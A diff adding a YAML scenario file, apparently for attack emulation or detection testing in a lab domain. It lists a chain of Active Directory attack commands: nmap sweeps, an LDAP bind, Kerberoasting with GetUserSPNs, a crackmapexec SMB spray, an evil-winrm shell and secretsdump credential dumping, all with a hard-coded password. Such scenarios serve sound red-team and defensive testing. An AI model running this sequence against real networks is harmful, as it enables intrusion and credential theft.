@@ -1,0 +1,11 @@
+name: "Noisy Recon & Lateral Movement Overload"
+steps:
+  - "nmap -p- 10.0.1.0/24"
+  - "nmap -sV -p- 10.0.2.0/24"
+  - "nmap -sC -sV 10.0.1.10"
+  - "ldapsearch -x -h 10.0.1.247 -D 'b.wright' -w 'Hello123' -b 'DC=WEST,DC=local'"
+  - "GetUserSPNs WEST.local/b.wright:Hello123 -dc-ip 10.0.1.247 -request"
+  - "GetUserSPNs WEST.local/b.wright:Hello123 -dc-ip 10.0.1.247 -request"
+  - "crackmapexec smb 10.0.1.0/24 -u b.wright -p Hello123 --local-auth"
+  - "evil-winrm -i 10.0.1.55 -u b.wright -p Hello123"
+  - "secretsdump b.wright:Hello123@10.0.1.55"
